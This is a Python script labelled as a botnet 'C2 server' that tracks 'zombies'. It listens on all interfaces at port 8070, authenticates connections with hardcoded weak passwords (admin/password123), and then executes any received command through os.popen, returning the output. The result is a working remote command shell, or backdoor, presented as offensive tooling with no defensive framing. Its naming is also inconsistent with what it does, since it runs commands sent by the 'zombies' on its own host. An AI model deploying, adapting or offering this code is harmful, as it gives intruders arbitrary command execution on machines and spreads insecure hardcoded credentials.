import socket
import threading
import os

# A dictionary storing usernames and passwords for login
USER_CREDENTIALS = {
    "admin": "password123",  # Username: admin, Password: password123
    "user": "userpass"
}

connected_zombies = []

def authenticate_client(client_socket):
    """
    Authenticates the client by asking for username and password.
    Returns True if authenticated, False otherwise.
    """
    client_socket.send("Username: ".encode())
    username = client_socket.recv(1024).decode().strip()

    client_socket.send("Password: ".encode())
    password = client_socket.recv(1024).decode().strip()

    if username in USER_CREDENTIALS and USER_CREDENTIALS[username] == password:
        client_socket.send(f"Welcome, {username}! Authentication successful.\n".encode())
        return True
    else:
        client_socket.send("Invalid credentials. Connection closing.\n".encode())
        return False

def handle_client(client_socket, client_address):
    print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")

    if not authenticate_client(client_socket):
        client_socket.close()
        print(f"[*] Connection closed from {client_address[0]}:{client_address[1]} (Failed login)")
        return

    connected_zombies.append(client_address[0])
    print(f"[*] Connected zombies: {', '.join(connected_zombies)}")
    
    while True:
        try:
            command = client_socket.recv(1024).decode()
            
            if not command:
                print(f"[*] Client {client_address[0]}:{client_address[1]} closed the connection.")
                break
            
            if command.lower() == "quit":
                print(f"[*] Client {client_address[0]}:{client_address[1]} sent 'quit' command.")
                break
            
            try:
                output = os.popen(command).read()
                client_socket.send(output.encode())
            except Exception as e:
                error_message = f"An error occurred while executing the command: {str(e)}\n"
                client_socket.send(error_message.encode())
        
        except ConnectionResetError:
            print(f"[*] Connection forcibly closed by {client_address[0]}")
            break

        except Exception as e:
            print(f"[*] Error handling client {client_address[0]}: {e}")
            break

    client_socket.close()
    print(f"[*] Connection closed from {client_address[0]}:{client_address[1]}")
    connected_zombies.remove(client_address[0])

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 8070))  # Bind to all available interfaces
    server_socket.listen(5)
    print("[*] C2 server started. Listening on port 8070")
    
    while True:
        try:
            client_socket, client_address = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.start()
        except KeyboardInterrupt:
            print("[*] Shutting down the server...")
            server_socket.close()
            break

if __name__ == "__main__":
    main()
